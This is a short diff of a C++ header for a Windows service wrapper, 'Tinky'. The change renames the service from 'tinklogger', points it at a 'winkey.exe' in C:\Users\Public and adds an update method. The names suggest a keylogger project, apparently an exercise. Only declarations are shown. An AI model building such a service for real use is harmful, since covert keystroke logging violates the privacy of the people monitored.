@@ -10,8 +10,8 @@
 # include <TlHelp32.h>
 
 
-# define SVCNAME TEXT("tinklogger")
-# define WINKEY_PATH TEXT("C:\\Users\\Devicekiller402\\Projects\\tinky-winkey\\winkey.exe")
+# define SVCNAME TEXT("tinky")
+# define WINKEY_PATH TEXT("C:\\Users\\Public\\winkey.exe")
 
 
 #pragma comment(lib, "advapi32.lib")
@@ -39,6 +39,7 @@ public:
 	bool			startService(void);
 	bool			stopService(void);
 	bool			deleteService(void);
+	bool			updateService(void);
 private:
 	Tinky(void);
 
